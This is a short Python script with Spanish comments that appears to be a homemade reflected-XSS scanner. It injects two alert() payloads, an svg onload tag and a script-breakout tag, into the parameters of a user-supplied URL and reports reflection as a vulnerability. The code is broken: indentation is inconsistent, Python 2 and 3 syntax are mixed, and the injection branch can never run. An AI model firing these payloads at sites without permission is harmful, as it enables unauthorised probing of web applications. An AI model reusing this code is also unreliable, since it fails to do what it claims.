#!/usr/bin/python

import requests
import colorama
from colorama import Fore, Back, Style
colorama.init()

def bada():
#funcion bada para salir del programa
    inp = input("Para salir presione (a) ")
    if inp == 'a':
        print ("adios vuelva pronto")
    else:
        print("opcion no valida, bye")
        exit()
def POST():
    print("Proximamente")

def GET():
    url=raw_input ("ingrese pagina web a auditar :")
    payload=['"><svg/onload=alert(0)>','"></script><script>alert(1)</script>']
    para= url.split("&")
#split para separar la url desde &
    cont= 0
#contador para realizar la condicion
    for pay in payload:
#para pay que no esta definido recorrer payload que son 2
	for param in para:
#para param que no esta definido recorrer hasta los parametros que tenga la url
		if cont == 1:
#si el contador es igual a 1 se incia la condicion
              		param=param.split("?")
#split separa la url despues del ?
                fullurl=url.replace(param,param+pay)
#fullurl es la magia que reemplaza la url por  url+param+payload
                request=requests.get(fullurl).text
#request nos entregara la respuesta de la url en html
		try:
			if pay in request:
#entonces si el payload se encuentra en la respuesta de la url la  url es vulnerable y asi con los paramtros tambien
        			print (Fore.GREEN + "la pagina web es vulnerable en el parametro: "+param +Style.RESET_ALL)
#print de url vulnerable con el paramtro segun contador
                		print (Fore.YELLOW +"Xss verificado con el payload en la url:"+requests.get(fullurl).url + Style.RESET_ALL)
#print de la url con payload son 2 payload verificado
        		if pay not in request:
                		print (Fore.RED + "El siquiente parametro no es vulnerable :"+param + Style.RESET_ALL)
#sino se encuentra el payload no es vulnerable
		except:
			print (Fore.RED + "la pagina web no es vulnerable" +Style.RESET_ALL)
try:
    lolo = raw_input("Seleccione el metodo: [G]ET or [P]OST (G/P): ").lower()
    if lolo == 'g':
        GET()
    elif lolo == 'p':
     	POST()
    else:
       	print("opcion incorrecta")
       	bada()
except:
	print("\nExit...")
	exit()

